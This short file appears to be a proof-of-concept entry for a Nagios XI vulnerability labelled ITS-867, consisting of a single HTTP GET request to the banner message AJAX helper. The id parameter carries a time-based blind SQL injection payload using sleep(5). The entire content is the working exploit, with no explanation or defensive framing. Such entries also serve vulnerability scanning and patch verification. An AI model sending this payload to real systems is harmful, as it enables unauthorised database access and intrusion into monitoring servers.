# Vulnerable: ITS-867
GET /nagiosxi/index.php/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=(SELECT+CASE+WHEN+1=1+THEN+sleep(5)+ELSE+sleep(0)+END+)
